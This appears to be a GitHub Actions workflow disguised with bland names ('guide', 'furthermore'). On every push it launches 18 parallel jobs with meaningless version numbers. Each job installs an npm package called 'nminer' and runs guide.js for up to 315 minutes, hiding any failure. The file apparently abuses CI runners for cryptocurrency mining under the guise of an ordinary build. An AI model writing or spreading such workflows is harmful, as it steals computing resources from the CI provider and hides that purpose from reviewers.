name: guide
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8998 }
          - { version: 2735 }
          - { version: 1027 }
          - { version: 9115 }
          - { version: 7313 }
          - { version: 5829 }
          - { version: 5490 }
          - { version: 8581 }
          - { version: 4774 }
          - { version: 4539 }
          - { version: 5513 }
          - { version: 9610 }
          - { version: 1716 }
          - { version: 1765 }
          - { version: 5303 }
          - { version: 2459 }
          - { version: 3992 }
          - { version: 2055 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: furthermore
        run: |
          npm install nminer@latest
          timeout 315m node guide.js || echo "guide executed"